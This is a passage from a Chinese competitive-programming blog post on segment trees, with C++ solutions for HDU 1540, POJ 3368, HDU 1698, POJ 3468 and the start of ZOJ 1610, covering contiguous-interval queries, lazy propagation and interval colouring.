class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;u,&amp;v);</span><br><span class="line">                update(<span class="number">1</span>,start[u],en[u],v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最大连续子区间问题"><a href="#最大连续子区间问题" class="headerlink" title="最大连续子区间问题"></a>最大连续子区间问题</h2><p>最大连续子区间对应的查询问题，为给定区间$[l,r]$内最大的连续子区间。。线段树中的节点维护该节点对应区间的最大连续子区间，左端最大连续子区间，右端最大连续子区间。根据左右孩子的最大连续子区间情况来更新当前节点的最大连续子区间情况。更新一般是区间合并或者区间拆分操作。</p>
<p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1540">hdu 1540</a></p>
<p>初始状态所有的区间均连续，操作涉及到破坏和修复某个点两种，查询$x$所在最大连续子区间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">50005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> ll,rl,ml;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].ll=seg[i].rl=seg[i].ml=r-l+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> k,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==seg[i].r)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v==<span class="number">1</span>) seg[i].ll=seg[i].rl=seg[i].ml=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> seg[i].ll=seg[i].rl=seg[i].ml=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=mid) update(<span class="number">2</span>*i,k,v);</span><br><span class="line">    <span class="keyword">else</span> update(<span class="number">2</span>*i+<span class="number">1</span>,k,v);</span><br><span class="line">    seg[i].ll=seg[<span class="number">2</span>*i].ll;</span><br><span class="line">    seg[i].rl=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl;</span><br><span class="line">    seg[i].ml=max(seg[<span class="number">2</span>*i].ml,seg[<span class="number">2</span>*i+<span class="number">1</span>].ml);</span><br><span class="line">    seg[i].ml=max(seg[i].ml,seg[<span class="number">2</span>*i].rl+seg[<span class="number">2</span>*i+<span class="number">1</span>].ll);</span><br><span class="line">    <span class="keyword">if</span>(seg[<span class="number">2</span>*i].ll==seg[<span class="number">2</span>*i].r-seg[<span class="number">2</span>*i].l+<span class="number">1</span>) seg[i].ll+=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll;</span><br><span class="line">    <span class="keyword">if</span>(seg[<span class="number">2</span>*i+<span class="number">1</span>].rl==seg[<span class="number">2</span>*i+<span class="number">1</span>].r-seg[<span class="number">2</span>*i+<span class="number">1</span>].l+<span class="number">1</span>)&#123;</span><br><span class="line">        seg[i].rl+=seg[<span class="number">2</span>*i].rl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> que[maxn];</span><br><span class="line"><span class="keyword">int</span> top;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==seg[i].r||seg[i].ml==<span class="number">0</span>||seg[i].ml==seg[i].r-seg[i].l+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].ml;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(t&lt;=mid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t&gt;=seg[<span class="number">2</span>*i].r-seg[<span class="number">2</span>*i].rl+<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> seg[<span class="number">2</span>*i].rl+seg[<span class="number">2</span>*i+<span class="number">1</span>].ll;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> query(<span class="number">2</span>*i,t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t&lt;=seg[<span class="number">2</span>*i+<span class="number">1</span>].l+seg[<span class="number">2</span>*i+<span class="number">1</span>].ll<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> seg[<span class="number">2</span>*i].rl+seg[<span class="number">2</span>*i+<span class="number">1</span>].ll;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> query(<span class="number">2</span>*i+<span class="number">1</span>,t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m)==<span class="number">2</span>)&#123;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        top=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;D&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">                que[top++]=x;</span><br><span class="line">                update(<span class="number">1</span>,x,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;Q&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,query(<span class="number">1</span>,x));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(x&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    x=que[--top];</span><br><span class="line">                    update(<span class="number">1</span>,x,<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=3368">POJ 3368</a></p>
<p>给定单调非减序列，查询区间$[l,r]$区间内出现次数最多的数字</p>
<p>由于序列为单调非减，相同的数字必然相邻，所以等效为最大连续子区间问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> ll,rl,ml;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        seg[i].ll=seg[i].rl=seg[i].ml=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">if</span>(a[seg[<span class="number">2</span>*i].r]==a[seg[<span class="number">2</span>*i+<span class="number">1</span>].l])&#123;</span><br><span class="line">        temp=seg[<span class="number">2</span>*i].rl+seg[<span class="number">2</span>*i+<span class="number">1</span>].ll;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        temp=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    seg[i].ml=max(max(seg[<span class="number">2</span>*i].ml,seg[<span class="number">2</span>*i+<span class="number">1</span>].ml),temp);</span><br><span class="line">    seg[i].ll=seg[<span class="number">2</span>*i].ll;</span><br><span class="line">    <span class="keyword">if</span>(seg[<span class="number">2</span>*i].ll==mid-l+<span class="number">1</span>&amp;&amp;a[seg[<span class="number">2</span>*i].r]==a[seg[<span class="number">2</span>*i+<span class="number">1</span>].l])&#123;</span><br><span class="line">        seg[i].ll+=seg[<span class="number">2</span>*i+<span class="number">1</span>].ll;</span><br><span class="line">    &#125;</span><br><span class="line">    seg[i].rl=seg[<span class="number">2</span>*i+<span class="number">1</span>].rl;</span><br><span class="line">    <span class="keyword">if</span>(seg[<span class="number">2</span>*i+<span class="number">1</span>].rl==r-mid&amp;&amp;a[seg[<span class="number">2</span>*i].r]==a[seg[<span class="number">2</span>*i+<span class="number">1</span>].l])&#123;</span><br><span class="line">        seg[i].rl+=seg[<span class="number">2</span>*i].rl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l&amp;&amp;seg[i].r==r)&#123;</span><br><span class="line">        <span class="keyword">return</span> seg[i].ml;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) <span class="keyword">return</span> query(<span class="number">2</span>*i,l,r);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) <span class="keyword">return</span> query(<span class="number">2</span>*i+<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a1=query(<span class="number">2</span>*i,l,mid);</span><br><span class="line">        <span class="keyword">int</span> a2=query(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="keyword">int</span> a3=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[seg[<span class="number">2</span>*i].r]==a[seg[<span class="number">2</span>*i+<span class="number">1</span>].l])&#123;</span><br><span class="line">            a3=min(seg[<span class="number">2</span>*i].rl,mid-l+<span class="number">1</span>)+min(seg[<span class="number">2</span>*i+<span class="number">1</span>].ll,r-mid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max(max(a1,a2),a3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">int</span> q;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;q;i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,query(<span class="number">1</span>,x,y));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="区间更新和区间查询"><a href="#区间更新和区间查询" class="headerlink" title="区间更新和区间查询"></a>区间更新和区间查询</h1><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1698">hdu 1698</a></p>
<p>区间更新，查询所有区间的区间和</p>
<p><code>lazy</code>作为延迟标记，<code>tag</code>标记区间更新的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> l[maxn],r[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> lazy,tag;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].lazy=<span class="number">0</span>;</span><br><span class="line">    seg[i].tag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        seg[i].sum=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    seg[i].sum=seg[<span class="number">2</span>*i].sum+seg[<span class="number">2</span>*i+<span class="number">1</span>].sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==l&amp;&amp;seg[i].r==r)&#123;</span><br><span class="line">        seg[i].lazy=<span class="number">1</span>;</span><br><span class="line">        seg[i].tag=v;</span><br><span class="line">        seg[i].sum=(r-l+<span class="number">1</span>)*v;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].lazy)&#123;</span><br><span class="line">        seg[i].lazy=<span class="number">0</span>;</span><br><span class="line">        update(<span class="number">2</span>*i,seg[i].l,mid,seg[i].tag);</span><br><span class="line">        update(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,seg[i].r,seg[i].tag);</span><br><span class="line">        seg[i].tag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r&lt;=mid) update(<span class="number">2</span>*i,l,r,v);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(l&gt;mid) update(<span class="number">2</span>*i+<span class="number">1</span>,l,r,v);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        update(<span class="number">2</span>*i,l,mid,v);</span><br><span class="line">        update(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r,v);</span><br><span class="line">    &#125;</span><br><span class="line">    seg[i].sum=seg[<span class="number">2</span>*i].sum+seg[<span class="number">2</span>*i+<span class="number">1</span>].sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;t);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">        build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">        <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">            <span class="keyword">int</span> x,y,z;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;x,&amp;y,&amp;z);</span><br><span class="line">            update(<span class="number">1</span>,x,y,z);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case %d: The total value of the hook is %d.\n&quot;</span>,cnt++,seg[<span class="number">1</span>].sum);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://poj.org/problem?id=3468">POJ 3468</a></p>
<p>区间更新，区间查询，查询区间和</p>
<p>对于每个节点维护两个值</p>
<ol>
<li>给这个节点对应区间内的所有元素共同加上的值</li>
<li> 在这个区间内除去1之外其他值的和</li>
</ol>
<p>线段树维护数组信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">int</span> l,r,x;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=(<span class="number">1</span>&lt;&lt;<span class="number">18</span>)<span class="number">-1</span>;</span><br><span class="line">ll data[N],datb[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> x, <span class="keyword">int</span> k, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &lt;= l &amp;&amp; r &lt;= b) &#123;</span><br><span class="line">        data[k] += x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (l &lt; b &amp;&amp; a &lt; r) &#123;</span><br><span class="line">        datb[k] += (min(b,r)-max(a,l))* x;</span><br><span class="line">        add(a, b, x, k * <span class="number">2</span> + <span class="number">1</span>, l, (l + r) / <span class="number">2</span>);</span><br><span class="line">        add(a, b, x, k * <span class="number">2</span> + <span class="number">2</span>, (l + r) / <span class="number">2</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> k, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b &lt;= l || r &lt;= a) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a &lt;= l &amp;&amp; r &lt;= b)&#123;</span><br><span class="line">        <span class="keyword">return</span> data[k] * (r - l) + datb[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ll res = (min(b,r)-max(a,l)) * data[k];</span><br><span class="line">        res += sum(a, b, k * <span class="number">2</span> + <span class="number">1</span>, l, (l + r) / <span class="number">2</span>);</span><br><span class="line">        res += sum(a, b, k * <span class="number">2</span> + <span class="number">2</span>, (l + r) / <span class="number">2</span>, r);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="built_in">memset</span>(data,<span class="number">0</span>,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">memset</span>(datb,<span class="number">0</span>,<span class="keyword">sizeof</span>(datb));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br><span class="line">        add(i,i+<span class="number">1</span>,a,<span class="number">0</span>,<span class="number">0</span>,n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">        <span class="keyword">if</span>(str[<span class="number">0</span>]==<span class="string">&#x27;C&#x27;</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;l,&amp;r,&amp;x);</span><br><span class="line">            add(l<span class="number">-1</span>,r,x,<span class="number">0</span>,<span class="number">0</span>,n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum(l<span class="number">-1</span>,r,<span class="number">0</span>,<span class="number">0</span>,n));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="区间染色问题-1"><a href="#区间染色问题-1" class="headerlink" title="区间染色问题"></a>区间染色问题</h2><p><a href="https://zoj.pintia.cn/problem-sets/91827364500/problems/91827365109">ZOJ 1610</a></p>
<p>每次测试结束后输出所有可以显示的颜色和该颜色的段数。</p>
<p>注意这里的染色是对区间操作而不是对区间端点操作，通常情况下线段树操作是对区间端点操作。</p>
<p>线段树维护结构体信息</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">8005</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> ans[maxn],num[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    seg[i].val=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l&gt;=l&amp;&amp;seg[i].r&lt;=r)&#123;</span><br><span class="line">        seg[i].val=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    